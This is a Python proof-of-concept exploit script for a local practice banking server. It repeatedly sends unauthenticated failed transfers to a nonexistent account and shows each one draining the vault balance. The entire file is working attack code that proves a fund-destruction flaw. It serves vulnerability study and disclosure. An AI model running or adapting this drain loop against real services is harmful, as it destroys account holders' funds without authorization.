#!/usr/bin/env python3
"""PoC (proven-live step, F-4): repeatable unauthenticated fund destruction.

Stronger than poc1_failed_transfer_destroys_funds.py: the destroy primitive
is repeatable - a loop of N failed transfers drains the source account
arbitrarily low without the attacker ever holding the money (pure denial of
assets). Demonstrates scale, not just a one-off glitch.
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = reproduced.
"""
import http.client
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"
ROUNDS = 5
AMOUNT = 1_000_000


def transfer(src: str, dst: str, amount: int) -> dict | None:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read().decode())
    except (urllib.error.URLError, http.client.HTTPException, ConnectionError, OSError):
        return None  # expected: handler crashes on the unknown destination


def balances() -> dict:
    return transfer("vault", "vault", 0)["balances"]


def main() -> int:
    start = balances()
    print(f"[read ] vault before drain loop: {start['vault']}")
    for i in range(ROUNDS):
        transfer("vault", "sink_does_not_exist", AMOUNT)
        now = balances()
        print(f"[loop {i + 1}/{ROUNDS}] vault now {now['vault']} "
              f"(failed transfer burned {AMOUNT})")
    end = balances()
    burned = start["vault"] - end["vault"]
    ok = burned == ROUNDS * AMOUNT
    if not ok:
        print("FAIL: drain loop did not burn the expected amount")
        return 1
    print(
        f"REPRODUCED: {ROUNDS} unauthenticated failed transfers destroyed "
        f"{burned} units of vault funds - repeatable asset destruction"
    )
    print("--- transcript (drain facts) ---")
    print(f"vault: {start['vault']} -> {end['vault']} over {ROUNDS} failed transfers")
    return 0


if __name__ == "__main__":
    sys.exit(main())
